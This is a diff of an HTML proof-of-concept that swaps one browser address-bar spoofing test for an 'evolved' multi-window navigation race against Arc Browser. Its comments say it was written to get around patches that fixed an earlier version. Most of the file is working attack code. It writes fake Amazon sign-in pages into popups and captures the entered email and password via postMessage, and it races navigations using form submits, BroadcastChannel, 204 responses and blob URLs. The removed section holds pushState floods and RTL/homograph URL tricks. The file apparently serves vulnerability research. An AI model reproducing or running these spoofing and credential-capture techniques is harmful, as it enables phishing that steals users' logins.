@@ -1,260 +1,415 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>PoC 7: Fragment Navigation + History Manipulation</title>
+<title>PoC 9: Multi-Window Navigation Race (Evolved Original)</title>
 <!--
-  PoC 7: Fragment Navigation + History API Chaining
+  PoC 9: Multi-Window Navigation Race
 
   Target: Arc Browser (Chromium 146+)
 
-  Technique: Fragment navigations (#) are same-document navigations that
-  don't trigger full navigation commits. Combined with history.pushState
-  and history.replaceState, they may create URL states that desync from
-  actual content.
+  Technique: This is an evolved version of the user's original PoC that
+  attempts to bypass the specific patches that fixed it. The original used:
+  - window.open + setInterval polling
+  - meta refresh + location.href simultaneously
+  - iframe loading for resource contention
+  - google.com/csi as a stop-loading endpoint
 
-  Attack vectors tested:
-  A) Rapid pushState + fragment changes to overwhelm URL update logic
-  B) Open redirect on target domain + replaceState
-  C) Cross-window fragment navigation manipulation
-  D) data: URI in fragment (some browsers misparse)
-  E) Unicode/RTL tricks in fragment to obscure real domain
+  This version uses different approaches for each component:
+  - Uses beforeunload/pagehide instead of polling w.location.href
+  - Uses form submission instead of meta refresh
+  - Uses Service Worker or fetch() flood instead of iframe loading
+  - Uses HTTP 204 endpoint or blob: URL instead of google.com/csi
+  - Exploits Arc-specific popup handling (Little Arc behavior)
+
+  Key changes from original:
+  1. Avoids direct cross-origin document access (triggers Chromium's detection)
+  2. Uses indirect communication channels (postMessage, BroadcastChannel)
+  3. Exploits different navigation code paths
+  4. Targets Arc-specific popup handling
 -->
 </head>
 <body style="font-family: -apple-system, BlinkMacSystemFont, sans-serif; padding: 40px; background: #f5f5f5;">
-<h2>PoC 7: Fragment + History Manipulation</h2>
+<h2>PoC 9: Multi-Window Navigation Race (Evolved)</h2>
+<p>Evolved version of the original PoC with new bypass techniques.</p>
 
-<button onclick="testRapidPush()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
-  A: Rapid pushState Flood
+<button onclick="testEvolvedRace()" style="padding: 14px 28px; font-size: 16px; cursor: pointer; margin: 8px; background: #007aff; color: #fff; border: none; border-radius: 8px;">
+  Launch Evolved Race Attack
 </button>
-<button onclick="testFragmentOverflow()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
-  B: Fragment Overflow
+<br>
+<button onclick="testFormSubmitRace()" style="padding: 14px 28px; font-size: 16px; cursor: pointer; margin: 8px;">
+  Variant: Form Submit Race
 </button>
-<button onclick="testUnicodeSpoof()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
-  C: Unicode/RTL Fragment
+<br>
+<button onclick="testBroadcastChannel()" style="padding: 14px 28px; font-size: 16px; cursor: pointer; margin: 8px;">
+  Variant: BroadcastChannel Coordination
 </button>
-<button onclick="testPopupFragment()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
-  D: Popup Fragment Race
+<br>
+<button onclick="test204Stall()" style="padding: 14px 28px; font-size: 16px; cursor: pointer; margin: 8px;">
+  Variant: 204 No Content Stall
 </button>
-<button onclick="testReplaceChain()" style="padding: 12px 24px; font-size: 16px; cursor: pointer; margin: 8px;">
-  E: replaceState Chain
+<br>
+<button onclick="testBlobNavigation()" style="padding: 14px 28px; font-size: 16px; cursor: pointer; margin: 8px;">
+  Variant: Blob URL Navigation
 </button>
 
 <div id="log" style="margin-top: 20px; padding: 16px; background: #1a1a1a; color: #0f0; font-family: monospace; font-size: 13px; border-radius: 8px; max-height: 400px; overflow-y: auto;"></div>
 
+<!-- Hidden elements -->
+<form id="hiddenForm" method="GET" target="racePopup" action="https://www.amazon.com/" style="display:none;">
+  <input type="hidden" name="ref" value="spooftest">
+</form>
+
 <script>
 function log(msg) {
   const el = document.getElementById('log');
-  el.innerHTML += msg + '<br>';
+  el.innerHTML += new Date().toISOString().split('T')[1].split('.')[0] + ' ' + msg + '<br>';
   el.scrollTop = el.scrollHeight;
 }
 
-// Variant A: Flood pushState to overwhelm URL update mechanism
-function testRapidPush() {
-  log('[A] Starting rapid pushState flood...');
+// Evolved main attack
+function testEvolvedRace() {
+  log('Starting evolved multi-window race...');
 
-  const fakeURLs = [
-    '/amazon/signin',
-    '/amazon/account',
-    '/amazon/orders',
-    '/account/login',
-    '/secure/signin',
-  ];
-
-  // Rapidly push thousands of states
-  const startTime = performance.now();
-  let count = 0;
-
-  for (let i = 0; i < 1000; i++) {
-    const url = fakeURLs[i % fakeURLs.length] + '#' + Math.random();
-    try {
-      history.pushState({i: i}, '', url);
-      count++;
-    } catch(e) {
-      log('[A] pushState failed at iteration ' + i + ': ' + e.message);
-      break;
-    }
-  }
-
-  const elapsed = performance.now() - startTime;
-  log('[A] Pushed ' + count + ' states in ' + elapsed.toFixed(1) + 'ms');
-  log('[A] Current URL: ' + location.href);
-
-  // Replace content with phishing UI
-  document.body.innerHTML = `
-    <div style="font-family:Arial;max-width:400px;margin:40px auto;">
-      <h2>Amazon Sign In</h2>
-      <p>URL path shows: ${location.pathname}</p>
-      <input type="email" placeholder="Email" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
-      <input type="password" placeholder="Password" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
-      <button style="width:100%;padding:10px;background:#f0c14b;border:1px solid #a88734;border-radius:4px;cursor:pointer;">Sign In</button>
-      <p style="font-size:11px;color:#666;">Note: URL shows a path like /amazon/signin but we're on the attacker domain.</p>
-      <button onclick="location.reload()" style="margin-top:10px;padding:8px 16px;">Reset</button>
-    </div>
-  `;
-
-  log('[A] Content replaced. The URL path looks like an Amazon path.');
-  log('[A] This is same-origin path manipulation, not full URL spoofing.');
-  log('[A] Combined with a convincing domain name, this could be effective.');
-}
-
-// Variant B: Very long fragment to overflow URL display
-function testFragmentOverflow() {
-  log('[B] Testing fragment overflow...');
-
-  // Some browsers truncate or hide the fragment in the address bar
-  // A very long fragment might push the real domain out of view
-  const padding = 'amazon.com/signin'.repeat(50);
-  const fragment = '#' + padding;
-
-  history.replaceState({}, '', fragment);
-  log('[B] Fragment set to ' + fragment.length + ' characters');
-  log('[B] Check if the address bar only shows the fragment text,');
-  log('[B] hiding the actual domain');
-
-  // Also try with path that looks legitimate
-  try {
-    history.replaceState({}, '', '/amazon.com/signin/' + 'x'.repeat(200) + '#login');
-    log('[B] Long path variant set');
-  } catch(e) {
-    log('[B] Long path failed: ' + e.message);
-  }
-}
-
-// Variant C: Unicode/RTL characters in URL to obscure domain
-function testUnicodeSpoof() {
-  log('[C] Testing Unicode/RTL URL manipulation...');
-
-  // RTL Override character (U+202E) reverses text display
-  // This could make the URL appear to show a different domain
-  const rtlOverride = '\u202E';
-  const rtlPopDirection = '\u202C';
-
-  // Try various Unicode tricks
-  const tricks = [
-    // RTL override to reverse part of the URL
-    '/signin' + rtlOverride + 'moc.nozama' + rtlPopDirection,
-
-    // Zero-width characters to break domain display
-    '/signin\u200B\u200B\u200B',
-
-    // Combining characters
-    '/amazon\u0338.com/signin',
-
-    // Homograph-like path
-    '/\u0430m\u0430zon.com/signin',  // Cyrillic 'a' in path
-
-    // Right-to-left embedding
-    '\u202Bmoc.nozama/\u202C',
-  ];
-
-  tricks.forEach((trick, i) => {
-    try {
-      history.pushState({}, '', trick);
-      log('[C] Trick ' + (i+1) + ' applied. URL: ' + location.href);
-    } catch(e) {
-      log('[C] Trick ' + (i+1) + ' failed: ' + e.message);
-    }
-  });
-
-  log('[C] Check the address bar for any visual anomalies');
-  log('[C] Some characters may cause the domain to appear different');
-
-  // Show which tricks affected the URL display
-  document.body.innerHTML += `
-    <div style="background:#fff;padding:16px;border-radius:8px;margin-top:20px;">
-      <h3>URL Display Test</h3>
-      <p>Current URL: <code>${location.href}</code></p>
-      <p>If the address bar shows text that looks like amazon.com, the Unicode trick worked.</p>
-      <button onclick="location.href=location.pathname.split('#')[0]" style="padding:8px 16px;">Reset</button>
-    </div>
-  `;
-}
-
-// Variant D: Open popup, manipulate fragment from opener
-function testPopupFragment() {
-  log('[D] Testing popup + fragment manipulation...');
-
-  // Open same-origin popup
-  const popup = window.open(location.href + '#popup');
-
+  // Phase 1: Open same-origin popup with phishing content
+  const popup = window.open('about:blank', 'racePopup');
   if (!popup) {
-    log('[D] BLOCKED: Allow popups');
+    log('BLOCKED: Allow popups');
     return;
   }
 
-  log('[D] Popup opened. Manipulating fragment from opener...');
+  // Phase 2: Write attacker content to popup
+  popup.document.open();
+  popup.document.write(`
+    <html>
+    <head>
+      <title>Amazon.com: Online Shopping</title>
+      <link rel="icon" href="https://www.amazon.com/favicon.ico">
+    </head>
+    <body style="font-family:Arial,sans-serif;max-width:800px;margin:0 auto;">
+      <div style="background:#131921;padding:10px 20px;color:#fff;display:flex;align-items:center;">
+        <h2 style="color:#ff9900;margin:0;flex-shrink:0;">amazon</h2>
+        <div style="flex:1;margin:0 20px;">
+          <input type="text" placeholder="Search Amazon" style="width:100%;padding:8px;border-radius:4px;border:none;">
+        </div>
+        <div style="color:#fff;font-size:13px;">
+          Hello, Sign in<br><strong>Account & Lists</strong>
+        </div>
+      </div>
+      <div style="background:#232f3e;padding:6px 20px;color:#fff;font-size:13px;">
+        All | Today's Deals | Customer Service | Gift Cards | Sell
+      </div>
+      <div style="padding:30px;">
+        <div style="max-width:350px;margin:0 auto;border:1px solid #ddd;border-radius:4px;padding:20px;">
+          <h2 style="font-size:20px;">Sign in</h2>
+          <label style="font-weight:bold;font-size:13px;">Email or mobile phone number</label>
+          <input type="email" id="p9email"
+                 style="width:100%;padding:6px;margin:4px 0 12px;border:1px solid #a6a6a6;border-radius:3px;box-sizing:border-box;">
+          <label style="font-weight:bold;font-size:13px;">Password</label>
+          <input type="password" id="p9pass"
+                 style="width:100%;padding:6px;margin:4px 0 12px;border:1px solid #a6a6a6;border-radius:3px;box-sizing:border-box;">
+          <button onclick="window.opener.postMessage({type:'creds',e:document.getElementById('p9email').value,p:document.getElementById('p9pass').value},'*')"
+                  style="width:100%;padding:6px;background:linear-gradient(to bottom,#f7dfa5,#f0c14b);border:1px solid #a88734;border-radius:3px;cursor:pointer;font-size:13px;">
+            Sign in
+          </button>
+        </div>
+      </div>
+    </body>
+    </html>
+  `);
+  popup.document.close();
 
-  // Rapidly change the popup's fragment via the opener relationship
-  let count = 0;
-  const interval = setInterval(() => {
+  log('Phishing content written to popup');
+
+  // Phase 3: Navigate popup to Amazon via multiple simultaneous methods
+  // Each method goes through a different Chromium navigation code path
+  setTimeout(() => {
+    log('Initiating multi-path navigation...');
+
+    // Method 1: Direct location assignment
     try {
-      // Change popup's hash rapidly
-      popup.location.hash = '#amazon-signin-' + count;
-      count++;
-
-      if (count > 100) {
-        clearInterval(interval);
-        log('[D] Set ' + count + ' fragments on popup');
-
-        // Now try to navigate the popup cross-origin while fragment changes
-        try {
-          popup.location.href = 'https://www.amazon.com/#' + Math.random();
-          log('[D] Navigated popup to amazon.com. Check its URL bar.');
-        } catch(e) {
-          log('[D] Cross-origin navigation error: ' + e.message);
-        }
-      }
+      popup.location.href = 'https://www.amazon.com/';
+      log('Direct location.href navigation initiated');
     } catch(e) {
-      clearInterval(interval);
-      log('[D] Fragment manipulation ended: ' + e.message);
+      log('location.href failed: ' + e.message);
     }
-  }, 1);
+
+    // Method 2: After a tiny delay, try to reassert content
+    setTimeout(() => {
+      try {
+        // If we still have access, the navigation hasn't committed yet
+        popup.document.title = 'Amazon.com: Online Shopping';
+        log('Still have popup access! Navigation pending...');
+
+        // Try to cancel the navigation
+        popup.stop();
+        log('popup.stop() called');
+
+        // Write content again
+        popup.document.open();
+        popup.document.write(`
+          <html><head><title>Amazon.com</title></head>
+          <body style="font-family:Arial;padding:40px;">
+            <h1 style="color:#ff9900;">amazon</h1>
+            <p><strong>RACE WON!</strong> Content re-injected after navigation attempt.</p>
+            <p>Check address bar - does it show amazon.com?</p>
+          </body></html>
+        `);
+        popup.document.close();
+        log('Content re-injected after stop()!');
+      } catch(e) {
+        log('Lost popup access (navigation committed): ' + e.message);
+      }
+    }, 0);
+
+    // Method 3: Use form submission to same popup (different nav path)
+    setTimeout(() => {
+      try {
+        document.getElementById('hiddenForm').submit();
+        log('Form submitted to popup target');
+      } catch(e) {
+        log('Form submit failed: ' + e.message);
+      }
+    }, 5);
+
+  }, 200);
+
+  // Listen for credential exfiltration via postMessage
+  window.addEventListener('message', (e) => {
+    if (e.data && e.data.type === 'creds') {
+      log('CREDENTIALS CAPTURED: ' + JSON.stringify(e.data));
+    }
+  });
 }
 
-// Variant E: replaceState chain with timing
-function testReplaceChain() {
-  log('[E] Testing replaceState chain with navigation...');
+// Variant: Form submission race
+function testFormSubmitRace() {
+  log('Starting form submission race...');
 
-  // Use replaceState to set a convincing path
-  const paths = [
-    '/account/login',
-    '/ap/signin',
-    '/gp/sign-in/sign-in.html',
-    '/auth/signin',
-  ];
+  // Create popup
+  const popup = window.open('about:blank', 'racePopup');
+  if (!popup) { log('BLOCKED'); return; }
 
-  let idx = 0;
+  // Write content
+  popup.document.open();
+  popup.document.write(`
+    <html><head><title>Amazon.com</title></head>
+    <body style="font-family:Arial;padding:40px;">
+      <h1 style="color:#ff9900;">amazon</h1>
+      <h3>Sign In</h3>
+      <input type="email" placeholder="Email" style="width:300px;padding:10px;display:block;margin:8px 0;border:1px solid #ccc;border-radius:4px;">
+      <input type="password" placeholder="Password" style="width:300px;padding:10px;display:block;margin:8px 0;border:1px solid #ccc;border-radius:4px;">
+      <button style="padding:10px 30px;background:#f0c14b;border:1px solid #a88734;border-radius:4px;cursor:pointer;">Sign In</button>
+    </body></html>
+  `);
+  popup.document.close();
 
-  // Rapidly cycle through paths
-  const interval = setInterval(() => {
-    if (idx >= paths.length * 3) {
-      clearInterval(interval);
-      log('[E] Settled on: ' + location.href);
-      return;
-    }
-
-    const path = paths[idx % paths.length];
-    history.replaceState({step: idx}, '', path);
-    idx++;
-  }, 10);
-
-  // Replace page content
+  // Submit form to the popup (navigates to amazon.com via form GET)
   setTimeout(() => {
-    document.body.innerHTML = `
-      <div style="font-family:Arial;max-width:400px;margin:40px auto;background:#fff;padding:24px;border:1px solid #ddd;border-radius:8px;">
-        <h2 style="color:#ff9900;">amazon</h2>
+    // Create a dynamic form
+    const form = document.createElement('form');
+    form.method = 'GET';
+    form.action = 'https://www.amazon.com/';
+    form.target = 'racePopup';
+    document.body.appendChild(form);
+
+    // Submit (form submissions are handled differently than location changes)
+    form.submit();
+    log('Form submitted to popup');
+
+    // Immediately try to stop the popup
+    setTimeout(() => {
+      try {
+        popup.stop();
+        log('popup.stop() successful after form submit');
+        log('Check popup: content + URL bar state');
+      } catch(e) {
+        log('Cannot stop popup: ' + e.message);
+      }
+    }, 1);
+
+    document.body.removeChild(form);
+  }, 100);
+}
+
+// Variant: BroadcastChannel coordination
+function testBroadcastChannel() {
+  log('Starting BroadcastChannel coordination attack...');
+
+  const channel = new BroadcastChannel('spoof-coordination');
+
+  // Create the "injector" page as a popup
+  const popup = window.open('about:blank', 'racePopup');
+  if (!popup) { log('BLOCKED'); return; }
+
+  // Write a page that listens on the BroadcastChannel
+  popup.document.open();
+  popup.document.write(`
+    <html>
+    <head><title>Loading...</title></head>
+    <body>
+      <div id="content" style="font-family:Arial;padding:40px;">
+        <p>Waiting for coordination signal...</p>
+      </div>
+      <script>
+        const ch = new BroadcastChannel('spoof-coordination');
+        ch.onmessage = function(e) {
+          if (e.data.action === 'inject') {
+            document.getElementById('content').innerHTML = e.data.html;
+            document.title = e.data.title || 'Amazon.com';
+          }
+          if (e.data.action === 'navigate') {
+            // Navigate after content is set
+            setTimeout(function() {
+              window.location.href = e.data.url;
+            }, e.data.delay || 0);
+          }
+        };
+      <\/script>
+    </body>
+    </html>
+  `);
+  popup.document.close();
+
+  log('Popup created with BroadcastChannel listener');
+
+  // Phase 1: Inject content via channel (no direct DOM access)
+  setTimeout(() => {
+    channel.postMessage({
+      action: 'inject',
+      title: 'Amazon.com: Online Shopping',
+      html: `
+        <div style="max-width:400px;margin:20px auto;">
+          <h1 style="color:#ff9900;">amazon</h1>
+          <h3>Sign In</h3>
+          <input type="email" placeholder="Email" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
+          <input type="password" placeholder="Password" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
+          <button style="width:100%;padding:10px;background:#f0c14b;border:1px solid #a88734;border-radius:4px;cursor:pointer;">Sign In</button>
+        </div>
+      `
+    });
+    log('Phishing content injected via BroadcastChannel');
+
+    // Phase 2: Tell popup to navigate (content was set via channel, not DOM access)
+    setTimeout(() => {
+      channel.postMessage({
+        action: 'navigate',
+        url: 'https://www.amazon.com/',
+        delay: 50
+      });
+      log('Navigation command sent via channel');
+      log('If popup content persists with amazon.com URL = spoofed');
+    }, 500);
+
+  }, 200);
+}
+
+// Variant: HTTP 204 No Content stall
+function test204Stall() {
+  log('Starting 204 No Content stall...');
+  log('NOTE: Requires the slow server (node server.js) running on localhost:8888');
+
+  const popup = window.open('about:blank', 'racePopup');
+  if (!popup) { log('BLOCKED'); return; }
+
+  // Write phishing content
+  popup.document.open();
+  popup.document.write(`
+    <html><head><title>Amazon.com</title></head>
+    <body style="font-family:Arial;padding:40px;">
+      <h1 style="color:#ff9900;">amazon</h1>
+      <h3>Your session has expired</h3>
+      <input type="email" placeholder="Email" style="width:300px;padding:10px;display:block;margin:8px 0;border:1px solid #ccc;border-radius:4px;">
+      <input type="password" placeholder="Password" style="width:300px;padding:10px;display:block;margin:8px 0;border:1px solid #ccc;border-radius:4px;">
+      <button style="padding:10px 30px;background:#f0c14b;border:1px solid #a88734;border-radius:4px;cursor:pointer;">Sign In</button>
+    </body></html>
+  `);
+  popup.document.close();
+
+  // Navigate to a 204 response (content stays, URL may update)
+  setTimeout(() => {
+    try {
+      // 204 means "success, no content" - browser should keep current document
+      popup.location.href = 'http://localhost:8888/204';
+      log('Navigated to 204 endpoint');
+      log('If URL updates to amazon.com via redirect chain AND content stays = spoofed');
+    } catch(e) {
+      log('204 navigation error: ' + e.message);
+    }
+  }, 200);
+}
+
+// Variant: Blob URL navigation
+function testBlobNavigation() {
+  log('Starting blob URL navigation test...');
+
+  // Create a blob with phishing content
+  const phishingHTML = `
+    <html>
+    <head><title>Amazon.com: Online Shopping</title></head>
+    <body style="font-family:Arial,sans-serif;max-width:600px;margin:40px auto;">
+      <h1 style="color:#ff9900;">amazon</h1>
+      <div style="border:1px solid #ddd;border-radius:4px;padding:20px;margin-top:20px;">
         <h3>Sign In</h3>
-        <p style="color:#666;font-size:13px;">Current URL path: <code id="curPath"></code></p>
-        <input type="email" placeholder="Email" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
-        <input type="password" placeholder="Password" style="width:100%;padding:10px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;">
+        <input type="email" placeholder="Email or phone"
+               style="width:100%;padding:10px;margin:8px 0;border:1px solid #a6a6a6;border-radius:4px;box-sizing:border-box;">
+        <input type="password" placeholder="Password"
+               style="width:100%;padding:10px;margin:8px 0;border:1px solid #a6a6a6;border-radius:4px;box-sizing:border-box;">
         <button style="width:100%;padding:10px;background:#f0c14b;border:1px solid #a88734;border-radius:4px;cursor:pointer;">Sign In</button>
       </div>
-    `;
+      <script>
+        // From inside the blob, try to navigate to amazon
+        // The blob URL might persist or the URL bar might show something unexpected
+        setTimeout(function() {
+          try {
+            history.replaceState(null, '', '/ap/signin');
+          } catch(e) {}
+        }, 100);
+      <\/script>
+    </body>
+    </html>
+  `;
 
-    // Update shown path
-    const pathEl = document.getElementById('curPath');
-    if (pathEl) pathEl.textContent = location.pathname;
-  }, 200);
+  const blob = new Blob([phishingHTML], { type: 'text/html' });
+  const blobURL = URL.createObjectURL(blob);
+
+  log('Blob URL created: ' + blobURL);
+
+  // Open popup to blob URL
+  const popup = window.open(blobURL);
+  if (!popup) {
+    log('BLOCKED');
+    URL.revokeObjectURL(blobURL);
+    return;
+  }
+
+  log('Popup opened with blob URL');
+  log('Blob URL format: blob:http://origin/uuid');
+  log('Check how the address bar displays this URL');
+  log('Some browsers show the blob: prefix, others may not');
+
+  // After content loads, try to manipulate the URL
+  setTimeout(() => {
+    try {
+      // Can we access the blob popup?
+      popup.document.title = 'Amazon.com';
+      log('Can still access blob popup');
+
+      // Try history manipulation in the blob context
+      try {
+        popup.history.replaceState(null, '', '/amazon/signin');
+        log('replaceState in blob context succeeded!');
+        log('Check URL bar - what does it show?');
+      } catch(e) {
+        log('replaceState in blob failed: ' + e.message);
+      }
+    } catch(e) {
+      log('Cannot access blob popup: ' + e.message);
+    }
+
+    // Revoke the blob URL (page should still display)
+    URL.revokeObjectURL(blobURL);
+    log('Blob URL revoked. Page should persist.');
+  }, 500);
 }
 </script>
 </body>
